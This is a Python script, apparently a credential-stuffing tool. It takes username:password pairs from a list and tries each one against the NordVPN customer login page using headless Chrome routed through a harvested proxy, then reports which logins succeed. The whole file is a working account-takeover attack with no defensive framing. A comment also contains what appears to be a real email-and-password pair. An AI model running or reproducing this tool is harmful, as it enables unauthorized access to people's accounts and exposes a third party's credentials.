from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from colorama import Fore, Back, Style
from proxybroker import Broker
import time,colorama,os,asyncio

#initialize colorama for later use
colorama.init()

class proxyy:
	pxy = ''

def get_proxy():
	proxies = asyncio.Queue()
	broker = Broker(proxies)
	tasks = asyncio.gather(
		broker.find(types=['HTTP'], limit=1),
		show(proxies))
	loop = asyncio.get_event_loop()
	loop.run_until_complete(tasks)

async def show(proxies):
	while True:
		proxy = await proxies.get()
		if proxy is None: break
		proxy = str(proxy)
		proxy = proxy.split('] ')
		proxy.pop(0)
		x = proxy.pop(0)
		x = x [:-1]
		proxyy.pxy = x

def make_list():
    username_list = []
    password_list = []
    with open ("list.txt",'r') as f:
        passlist = [line.strip() for line in f]
        for item in passlist:
            login_split = item.split(":")
            username_list.append(login_split[0])
            password_list.append(login_split[1])
    return username_list,password_list

#get the elements
def find_elements(driver):
    #find the username element by name
    username = driver.find_element_by_name('username')
    #find the password element
    password = driver.find_element_by_name('password')
    #find the submit button
    login_button = driver.find_element_by_xpath('//*[@id="app"]/div/main/div/div/div/form/div/button')
    return username,password,login_button
#end of find_elements function

#send the specific login keys to their respective elements
def send_login(u,p,login_button,uName,pWord):
    #send given username into its text field
    u.send_keys(uName)
    #send popped password into its respective text field
    p.send_keys(pWord)
    #click the submit button
    login_button.click()
#end of send_login function

#check if the login worked or not
def is_logged_in(driver,username,password):
    try:
        username = driver.find_element_by_name('username')
        driver.get("https://ucp.nordvpn.com/login/")
        return False
    except:
        return True
#end log in check function

#mccollum500@gmail.com:monkey123
get_proxy()
proxy = proxyy.pxy
desired_capabilities = webdriver.DesiredCapabilities.CHROME['proxy'] = {
    "httpProxy":proxy,
    "ftpProxy":proxy,
    "sslProxy":proxy,
    "noProxy":None,
    "proxyType":"MANUAL",
    "class":"org.openqa.selenium.Proxy",
    "autodetect":False
}
#clear instances that may have been left open
os.system('taskkill /IM chromedriver.exe /F')
#set the webdriver to chrome because why not
chrome_options = Options()
chrome_options.add_argument("--headless")
driver = webdriver.Chrome(chrome_options=chrome_options, executable_path="chromedriver.exe", desired_capabilities=desired_capabilities)
#get the instagram page
driver.get('https://ucp.nordvpn.com/login/')
time.sleep(5)
#find the username,password and login button elements so that we can use them elsewhere
username,password,login_button = find_elements(driver)
#make a password list seperated by returns
username_list,password_list = make_list()
#get the length of said list
pass_list_length = len(username_list)
#print out that the x number of passwords were loaded
print (Fore.GREEN + "[*] {0} logins loaded successfully".format(pass_list_length))
#for every item in the list starting at 0
for i in range(0, pass_list_length):
    username,password,login_button = find_elements(driver)
    #get number i popped from the list
    uName,pWord = username_list[i],password_list[i]
    #attempt to login
    send_login(username,password,login_button,uName,pWord)
    #neccasary sleep for 1 second or else it doesnt have time to load
    time.sleep(2)
    #get true or false if it worked
    balance_beam = is_logged_in(driver,username,password)
    if balance_beam:
        print (Fore.GREEN + "[!] Logged in as {0} with password {1}".format(uName,pWord))
    else:
        print (Fore.RED + "[*] Failed to login as {0} with password {1}".format(uName,pWord))
        print ("[-] Attempt {0}/{1}".format(i+1,pass_list_length))